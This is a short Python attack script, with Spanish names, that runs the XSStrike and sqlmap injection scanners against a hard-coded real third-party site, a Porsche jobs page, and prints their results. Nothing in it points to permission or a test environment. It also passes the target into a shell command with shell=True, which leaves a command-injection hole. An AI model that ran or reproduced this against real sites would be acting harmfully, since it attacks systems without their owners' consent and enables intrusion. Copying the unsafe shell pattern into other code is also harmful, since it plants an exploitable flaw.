import subprocess

class AtaqueWeb:
    def __init__(self, objetivo):
        self.objetivo = objetivo

    def ejecutar_xssstrike(self):
        """
        Ejecuta xssstrike en la URL objetivo.
        Devuelve la salida de xssstrike.
        """
        try:
            comando = f'xssstrike -u {self.objetivo}'
            resultado = subprocess.check_output(comando, shell=True, stderr=subprocess.STDOUT, text=True)
            return resultado
        except Exception as e:
            return str(e)

    def ejecutar_sqlmap(self):
        """
        Ejecuta sqlmap en la URL objetivo.
        Devuelve la salida de sqlmap.
        """
        try:
            comando = f'sqlmap -u {self.objetivo}'
            resultado = subprocess.check_output(comando, shell=True, stderr=subprocess.STDOUT, text=True)
            return resultado
        except Exception as e:
            return str(e)
if __name__ == '__main__':
    # URL de destino para los ataques
    url_objetivo = 'https://jobs.porsche.com/index.php?ac=start'



    # Crear una instancia de la clase AtaqueWeb
    ataque = AtaqueWeb(url_objetivo)

    # Ejecutar xssstrike en la URL
    resultado_xss = ataque.ejecutar_xssstrike()
    print("Resultados de xssstrike:")
    print(resultado_xss)

    # Ejecutar sqlmap en la URL
    resultado_sqlmap = ataque.ejecutar_sqlmap()
    print("\nResultados de sqlmap:")
    print(resultado_sqlmap)